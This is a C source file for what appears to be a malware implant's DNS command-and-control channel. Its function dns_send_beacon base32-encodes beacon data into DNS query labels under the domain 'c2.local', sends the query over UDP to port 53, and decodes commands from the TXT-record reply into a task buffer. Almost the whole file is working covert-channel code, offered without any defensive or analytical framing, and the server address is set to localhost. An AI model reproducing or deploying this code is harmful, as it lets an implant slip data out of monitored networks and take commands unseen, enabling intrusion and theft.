#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#ifdef _WIN32
    #include <winsock2.h>
    typedef int socklen_t;
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/time.h>
#endif

#define SERVER_IP   "127.0.0.1"
#define DNS_PORT    53

static const char b32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static int base32_encode(const uint8_t *in, size_t in_len, char *out, size_t out_len) {
    if (!in || !out || out_len == 0) return 0;
    size_t j = 0;
    int buf = in[0], next = 1, bitsLeft = 8;
    while (bitsLeft > 0 || next < (int)in_len) {
        if (bitsLeft < 5) {
            if (next < (int)in_len) {
                buf <<= 8;
                buf |= in[next++] & 0xff;
                bitsLeft += 8;
            } else {
                int pad = 5 - bitsLeft;
                buf <<= pad;
                bitsLeft += pad;
            }
        }
        int idx = 0x1f & (buf >> (bitsLeft - 5));
        bitsLeft -= 5;
        if (j < out_len - 1)
            out[j++] = b32[idx];
    }
    out[j] = 0;
    return (int)j;
}

static int base32_decode(const char *in, uint8_t *out, size_t out_len) {
    if (!in || !out) return 0;
    int buf = 0, bitsLeft = 0;
    size_t j = 0;
    for (const char *p = in; *p; p++) {
        char c = *p;
        if (c >= 'A' && c <= 'Z') buf = (buf << 5) | (c - 'A');
        else if (c >= 'a' && c <= 'z') buf = (buf << 5) | (c - 'a');
        else if (c >= '2' && c <= '7') buf = (buf << 5) | (c - '2' + 26);
        else continue;
        bitsLeft += 5;
        if (bitsLeft >= 8) {
            if (j < out_len)
                out[j++] = (buf >> (bitsLeft - 8)) & 0xff;
            bitsLeft -= 8;
        }
    }
    return (int)j;
}

void dns_send_beacon(uint8_t *beacon, size_t beacon_len, uint8_t *task_out, size_t *task_len) {
    if (task_len) *task_len = 0;

    char encoded[1024];
    base32_encode(beacon, beacon_len, encoded, sizeof(encoded));
    size_t enc_len = strlen(encoded);

    uint8_t query[512];
    memset(query, 0, sizeof(query));
    int qlen = 0;

    // DNS header
    query[qlen++] = 0x00; query[qlen++] = 0x01; // Transaction ID
    query[qlen++] = 0x01; query[qlen++] = 0x00; // Flags: Standard query, recursion desired
    query[qlen++] = 0x00; query[qlen++] = 0x01; // QDCOUNT = 1
    query[qlen++] = 0x00; query[qlen++] = 0x00; // ANCOUNT = 0
    query[qlen++] = 0x00; query[qlen++] = 0x00; // NSCOUNT = 0
    query[qlen++] = 0x00; query[qlen++] = 0x00; // ARCOUNT = 0

    // Split base32 into chunks of max 63 characters (RFC 1035 compliance)
    size_t offset = 0;
    while (offset < enc_len) {
        size_t chunk = enc_len - offset;
        if (chunk > 63) chunk = 63;
        if (qlen + 1 + (int)chunk >= (int)sizeof(query) - 32) break;
        query[qlen++] = (uint8_t)chunk;
        memcpy(query + qlen, encoded + offset, chunk);
        qlen += (int)chunk;
        offset += chunk;
    }

    // Append domain labels: "c2.local"
    query[qlen++] = 2;
    memcpy(query + qlen, "c2", 2);
    qlen += 2;

    query[qlen++] = 5;
    memcpy(query + qlen, "local", 5);
    qlen += 5;

    query[qlen++] = 0x00; // Root label

    // QTYPE TXT (16), QCLASS IN (1)
    query[qlen++] = 0x00; query[qlen++] = 0x10;
    query[qlen++] = 0x00; query[qlen++] = 0x01;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    // Set 2-second receive timeout to avoid blocking indefinitely
#ifdef _WIN32
    DWORD timeout = 2000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const void*)&tv, sizeof(tv));
#endif

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(DNS_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    sendto(sock, (const char*)query, qlen, 0, (struct sockaddr*)&server, sizeof(server));

    uint8_t response[512];
    socklen_t slen = sizeof(server);
    int rlen = recvfrom(sock, (char*)response, sizeof(response), 0, (struct sockaddr*)&server, &slen);

    if (rlen >= 12) {
        // Skip Question Section
        int pos = 12;
        while (pos < rlen && response[pos] != 0) {
            if ((response[pos] & 0xc0) == 0xc0) { pos += 2; break; }
            pos += response[pos] + 1;
        }
        if (pos < rlen && response[pos] == 0) pos++;
        pos += 4; // Skip QTYPE and QCLASS

        // Skip Answer Name
        if (pos < rlen && (response[pos] & 0xc0) == 0xc0) pos += 2;
        else while (pos < rlen && response[pos] != 0) pos++;

        pos += 10; // Skip TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2)
        if (pos < rlen) {
            int txt_len = response[pos++];
            if (pos + txt_len <= rlen && txt_len < 256) {
                char txt[256];
                memcpy(txt, response + pos, txt_len);
                txt[txt_len] = 0;
                if (task_out && task_len) {
                    *task_len = (size_t)base32_decode(txt, task_out, 1024);
                }
            }
        }
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}
